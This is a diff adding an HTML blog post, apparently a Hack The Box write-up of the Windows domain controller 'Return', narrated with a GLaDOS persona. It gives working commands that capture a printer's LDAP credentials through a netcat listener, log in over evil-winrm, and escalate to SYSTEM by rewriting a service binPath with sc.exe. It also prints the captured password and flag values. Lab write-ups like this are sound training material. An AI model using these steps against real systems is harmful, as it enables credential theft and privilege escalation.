@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="A printer admin panel, an LDAP credential heist, and a Server Operators privilege escalation walk into a test chamber. Chell navigates Windows Active Directory exploitation on a domain controller.">
+  <meta name="theme-color" content="#0a0a0f">
+  <title>Return | Hack the Cube</title>
+
+  <meta property="og:title" content="Return - Hack the Cube">
+  <meta property="og:description" content="Printer admin panels store passwords. Server Operators own services. For science.">
+  <meta property="og:image" content="/blog/posts/return/images/header.png">
+  <meta property="og:type" content="article">
+  <meta property="article:published_time" content="2026-02-15T00:00:00Z">
+
+  <link rel="stylesheet" href="/blog/assets/styles/blog.css">
+</head>
+<body>
+  <div class="blog-container">
+
+    <header style="padding: 1rem 0; border-bottom: 2px solid var(--border-dim); margin-bottom: 2rem;">
+      <a href="/blog/" style="display: flex; align-items: center; gap: 1rem; text-decoration: none;">
+        <span style="font-family: var(--font-pixel); font-size: 0.8rem; color: var(--terminal-green);">
+          &lt; HACK THE CUBE
+        </span>
+      </a>
+    </header>
+
+    <header class="post-header">
+      <h1 class="post-title">Return</h1>
+
+      <div class="post-meta">
+        <div class="post-meta-item">
+          <span class="post-meta-label">Date:</span>
+          <span>February 15, 2026</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">Difficulty:</span>
+          <span class="post-difficulty easy">Easy</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">OS:</span>
+          <span>Windows</span>
+        </div>
+        <div class="post-meta-item solve-time">
+          <span class="post-meta-label">SOLVE TIME:</span>
+          <span class="time-value">~00:45:00</span>
+        </div>
+      </div>
+
+      <img
+        src="/blog/posts/return/images/header.png"
+        alt="Return - Windows Active Directory printer exploitation"
+        class="post-header-image"
+      >
+
+      <div class="tags-container" style="justify-content: center;">
+        <a href="/blog/tags/windows.html" class="tag">windows</a>
+        <a href="/blog/tags/easy.html" class="tag">easy</a>
+        <a href="/blog/tags/ldap.html" class="tag">ldap</a>
+        <a href="/blog/tags/active-directory.html" class="tag">active-directory</a>
+        <a href="/blog/tags/winrm.html" class="tag">winrm</a>
+        <a href="/blog/tags/printer.html" class="tag">printer</a>
+        <a href="/blog/tags/privesc.html" class="tag">privesc</a>
+        <a href="/blog/tags/glados.html" class="tag glados">glados</a>
+      </div>
+
+      <div class="post-characters">
+        <span class="post-meta-label">Guides:</span>
+        <span class="character-glados">GlaDOS</span>
+      </div>
+    </header>
+
+    <main class="post-content">
+
+      <h2>The Mission Briefing</h2>
+
+      <p>The box was called <strong>Return</strong>. A Windows machine. Easy difficulty. A domain controller running Active Directory, which meant this wasn't just about getting root &mdash; it was about understanding how Windows enterprise environments fail.</p>
+
+      <p>My first HTB Windows box. After three Linux machines, I was stepping into a completely different world &mdash; Active Directory, Kerberos, LDAP, SMB. Services I'd read about but never exploited. GlaDOS seemed... almost excited. If excitement is something she's capable of. I have my doubts.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"A Windows domain controller. Running a printer admin panel. On the internet. I want you to sit with that for a moment. This is the digital equivalent of leaving your house keys taped to the front door with a sign that says 'keys here.' Let's see how long it takes you to walk in."</div>
+      </div>
+
+      <h2>Reconnaissance</h2>
+
+      <p>The TCP scan came back loud. Thirteen open ports. This wasn't a minimal Linux box with SSH and a web server &mdash; this was a full Windows domain controller announcing its entire identity to anyone who asked.</p>
+
+      <div class="terminal-log">
+nmap -sC -sV 10.129.95.241
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS 10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+                              (Domain: return.local)
+445/tcp  open  microsoft-ds
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0</div>
+
+      <p>The interesting parts jumped out immediately:</p>
+
+      <ul>
+        <li><strong>Port 80</strong> &mdash; IIS web server with a title that read "HTB Printer Admin Panel"</li>
+        <li><strong>Port 389/3268</strong> &mdash; LDAP. Domain: <code>return.local</code></li>
+        <li><strong>Port 88</strong> &mdash; Kerberos. This is a domain controller</li>
+        <li><strong>Port 5985</strong> &mdash; WinRM. Windows Remote Management. If I get credentials, this is my way in</li>
+      </ul>
+
+      <p>A printer admin panel on a domain controller. The attack surface was practically waving at me.</p>
+
+      <h2>The Printer Settings Page</h2>
+
+      <p>I browsed to port 80 and found a simple printer admin interface. Home page, Settings, Fax, Troubleshooting. The Settings page is where things got interesting:</p>
+
+      <div class="terminal-log">
+Server Address: printer.return.local
+Server Port:    389
+Username:       svc-printer
+Password:       *******</div>
+
+      <p>The printer was configured to authenticate against an <strong>LDAP server</strong> using a service account called <code>svc-printer</code>. The password was masked with asterisks in the browser. But here's the thing about masked passwords in web forms &mdash; the mask is cosmetic. The actual password still gets sent when the form is submitted.</p>
+
+      <p>More importantly, the <strong>Server Address</strong> field was editable. The printer would connect to whatever LDAP server you pointed it at. And when a device authenticates to an LDAP server, it sends the credentials in the connection request.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"The printer is configured to send its credentials to any server address you provide. No validation. No certificate pinning. No questions asked. It's essentially a vending machine for passwords &mdash; you just need to tell it where to deliver them. Change the server address to your machine. I'll wait while you realize how trivial this is."</div>
+      </div>
+
+      <h2>The LDAP Credential Heist</h2>
+
+      <p>This is a technique I hadn't seen before, and it taught me something fundamental about how network authentication works.</p>
+
+      <p>When a device authenticates to an LDAP server using <strong>Simple Bind</strong>, it sends the username and password in <strong>cleartext</strong> as part of the LDAP protocol. If you can redirect that connection to a server you control, you capture the credentials. It's an SSRF-style attack, but instead of making the server fetch a URL, you're making it authenticate to you.</p>
+
+      <p>The steps:</p>
+
+      <ol>
+        <li>Start a listener on port 389 (LDAP port) on my attack box</li>
+        <li>Change the Server Address field from <code>printer.return.local</code> to my IP</li>
+        <li>Submit the form</li>
+        <li>The printer connects to me, sends its LDAP bind credentials</li>
+      </ol>
+
+      <div class="terminal-log">
+nc -lvnp 389
+# In another terminal:
+curl -s -X POST http://10.129.95.241/settings.php -d "ip=10.10.14.8"
+
+# Netcat captures the LDAP bind:
+listening on [any] 389 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.129.95.241] 50948
+0*`%return\svc-printer&mdash;1edFg43012!!</div>
+
+      <p>There it was. Mixed in with the LDAP protocol bytes: <code>return\svc-printer</code> and the password <code>1edFg43012!!</code>. I verified the exact bytes with a hex dump to make sure I wasn't misreading protocol overhead as password characters:</p>
+
+      <div class="terminal-log">
+xxd /tmp/ldap_capture.raw
+
+00000000: 302a 0201 0160 2502 0102 0412 retu  0*...`%.....retu
+00000010: 726e 5c73 7663 2d70 7269 6e74 6572 800c  rn\svc-printer..
+00000020: 3165 6446 6734 3330 3132 2121            1edFg43012!!</div>
+
+      <p>Clean. Twelve bytes. <code>1edFg43012!!</code>. No ambiguity.</p>
+
+      <h2>The Shell Escaping Detour</h2>
+
+      <p>Here's where I learned a painful lesson that had nothing to do with hacking and everything to do with shells.</p>
+
+      <p>I tried to authenticate with the password and kept getting <code>STATUS_LOGON_FAILURE</code>. The credentials were correct &mdash; I'd verified them byte by byte &mdash; but every tool rejected them.</p>
+
+      <p>The problem? <strong>Zsh history expansion.</strong> The <code>!!</code> at the end of the password is a special sequence in zsh that expands to the last command you ran. Even inside single quotes. Even inside <code>printf</code>. My shell was mangling the password before it ever reached the authentication tool.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"You verified the password with a hex dump. You confirmed it byte by byte. And then your own shell betrayed you. There's a metaphor here about trust and infrastructure, but I'll let you find it yourself. Write the password to a file. Bypass the shell entirely. It's what I would do. If I had to deal with shells. Which I don't. Because I am the system."</div>
+      </div>
+
+      <p>The fix was writing the password to a file using a tool that doesn't go through shell interpretation, then reading it with <code>$(cat /tmp/p.txt)</code>. Once the shell was out of the equation, authentication worked immediately:</p>
+
+      <div class="terminal-log">
+netexec smb 10.129.95.241 -u svc-printer -p "$(cat /tmp/p.txt)"
+
+SMB  10.129.95.241  445  PRINTER  [+] return.local\svc-printer:1edFg43012!!</div>
+
+      <p>That <code>[+]</code> never looked so good.</p>
+
+      <p><strong>Lesson learned:</strong> When passwords contain special characters (<code>!</code>, <code>$</code>, backticks), always consider shell expansion. Write to a file, use heredocs, or disable history expansion. Your tools aren't broken &mdash; your shell is "helping."</p>
+
+      <h2>User Flag</h2>
+
+      <p>With valid credentials and WinRM on port 5985, getting a shell was straightforward:</p>
+
+      <div class="terminal-log">
+evil-winrm -i 10.129.95.241 -u svc-printer -p "$(cat /tmp/p.txt)"
+
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
+return\svc-printer
+
+*Evil-WinRM* PS > type C:\Users\svc-printer\Desktop\user.txt
+<span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">The flag is a lie</span><span class="flag-revealed">58c7fe1374a20849402100bfe5afbfd5</span></span></div>
+
+      <p>First flag down. But I was a service account on a domain controller. Getting to SYSTEM would require understanding what privileges this account actually had.</p>
+
+      <h2>The Privilege Escalation</h2>
+
+      <p>On Windows, privilege escalation starts with one command: <code>whoami /all</code>. It tells you everything about your current identity &mdash; groups, privileges, SIDs. On Linux you check <code>id</code> and <code>sudo -l</code>. On Windows, <code>whoami /all</code> is your roadmap.</p>
+
+      <div class="terminal-log">
+*Evil-WinRM* PS > whoami /all
+
+GROUP INFORMATION
+-----------------
+BUILTIN\Server Operators    Enabled
+BUILTIN\Print Operators     Enabled
+BUILTIN\Remote Management Users  Enabled
+
+PRIVILEGES INFORMATION
+----------------------
+SeBackupPrivilege     Back up files and directories    Enabled
+SeRestorePrivilege    Restore files and directories    Enabled
+SeLoadDriverPrivilege Load and unload device drivers   Enabled</div>
+
+      <p>Three things jumped out:</p>
+
+      <ol>
+        <li><strong>Server Operators group</strong> &mdash; Members can start, stop, and <em>reconfigure</em> Windows services</li>
+        <li><strong>SeBackupPrivilege</strong> &mdash; Can read any file on the system regardless of ACLs</li>
+        <li><strong>SeLoadDriverPrivilege</strong> &mdash; Can load kernel drivers</li>
+      </ol>
+
+      <p>Any of these could lead to SYSTEM. But Server Operators is the most straightforward path, and this box was teaching me about service abuse.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"Server Operators. A group that can modify what Windows services execute. On a domain controller. Where services run as SYSTEM. I want you to connect these dots. A service runs a binary. You can change which binary it runs. The service runs as SYSTEM. Therefore... take your time. I have patience. Unlike the Windows security model, apparently."</div>
+      </div>
+
+      <p>Here's the concept: Windows services run executables under specific accounts, often <code>NT AUTHORITY\SYSTEM</code>. The <strong>Server Operators</strong> group can modify service configurations, including the <code>binPath</code> &mdash; the executable that runs when the service starts. If you change a SYSTEM service's binary path to your own command and restart it, your command runs as SYSTEM.</p>
+
+      <p>I chose the VSS (Volume Shadow Copy) service as my target. Changed its binary path to copy the root flag to a location I could read, then started the service:</p>
+
+      <div class="terminal-log">
+*Evil-WinRM* PS > sc.exe config VSS binPath="cmd /c copy C:\Users\Administrator\Desktop\root.txt C:\Users\svc-printer\Desktop\root.txt"
+[SC] ChangeServiceConfig SUCCESS
+
+*Evil-WinRM* PS > sc.exe start VSS
+[SC] StartService FAILED 1053:
+The service did not respond to the start or control request in a timely fashion.</div>
+
+      <p>Error 1053. The service "failed" &mdash; because <code>cmd /c copy</code> isn't a real service binary and doesn't respond to the Service Control Manager properly. But the command still <strong>executed</strong> before the timeout. That's the trick: Windows runs the binary first, then waits for the service response. Our command finishes before the timeout hits.</p>
+
+      <div class="terminal-log">
+*Evil-WinRM* PS > type C:\Users\svc-printer\Desktop\root.txt
+<span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">The flag is a lie</span><span class="flag-revealed">67f4702225bd9aa2248e7b8539d2a973</span></span></div>
+
+      <p>Root flag captured. Both flags obtained.</p>
+
+      <h2>What I Learned</h2>
+
+      <p>Return was my first Windows box, and it taught me fundamentals that transfer to every Windows engagement:</p>
+
+      <ul>
+        <li><strong>Printer admin panels are credential goldmines</strong> &mdash; They store LDAP bind passwords, SMTP credentials, network shares. The settings page is always the first place to look</li>
+        <li><strong>LDAP Simple Bind is cleartext</strong> &mdash; If you can redirect an LDAP authentication to your machine, you get the password. No cracking required</li>
+        <li><strong>Shell expansion will ruin your day</strong> &mdash; Special characters in passwords (<code>!</code>, <code>$</code>, backticks) interact with shell features. Write passwords to files to bypass interpretation</li>
+        <li><strong><code>whoami /all</code> is your Windows privesc roadmap</strong> &mdash; Groups and privileges matter as much as the username. Server Operators, Backup Operators, Print Operators &mdash; each has known escalation paths</li>
+        <li><strong>Service abuse via Server Operators</strong> &mdash; If you can modify a service that runs as SYSTEM, you own the machine. Change the binPath, restart, profit</li>
+        <li><strong>Error 1053 doesn't mean failure</strong> &mdash; The command executes before the service manager gives up. Your payload ran even though the "service" never started properly</li>
+      </ul>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"Test complete. Both flags obtained. Your first Windows box, and you managed to avoid most of the common pitfalls. Except the shell escaping one. Which was entirely your fault. The attack path was elegant: a printer misconfiguration leaked credentials, a lazy group membership provided escalation, and a service reconfiguration delivered root. The entire chain existed because someone gave a printer service account Server Operators privileges on a domain controller. Humanity's commitment to convenience over security remains... consistent. Same time next test chamber?"</div>
+      </div>
+
+    </main>
+
+    <aside class="attack-path">
+      <h3>Attack Path Summary</h3>
+      <ol>
+        <li>Nmap scan: 13 ports open, IIS on 80 with "HTB Printer Admin Panel," WinRM on 5985, AD DC for <strong>return.local</strong></li>
+        <li>Settings page exposed LDAP config: <strong>svc-printer</strong> account, editable server address</li>
+        <li>Redirected LDAP auth to attacker IP, captured cleartext password via netcat on port 389</li>
+        <li>Hex dump verified password: <strong>1edFg43012!!</strong></li>
+        <li>evil-winrm shell as svc-printer, captured <strong>user flag</strong></li>
+        <li><code>whoami /all</code> revealed <strong>Server Operators</strong> group membership</li>
+        <li>Reconfigured VSS service binPath to copy root.txt, restarted service</li>
+        <li>Read copied file &mdash; <strong>root flag</strong> captured</li>
+      </ol>
+    </aside>
+
+    <nav class="post-nav">
+      <a href="/blog/posts/antique/" class="post-nav-link prev">Antique</a>
+      <span></span>
+    </nav>
+
+    <footer class="blog-footer">
+      <p class="footer-text">
+        <a href="/blog/" class="footer-link">Back to Test Chamber Archives</a>
+      </p>
+      <p class="footer-text" style="font-size: 0.8rem; color: var(--text-dim);">
+        For science. You monster.
+      </p>
+    </footer>
+
+  </div>
+</body>
+</html>
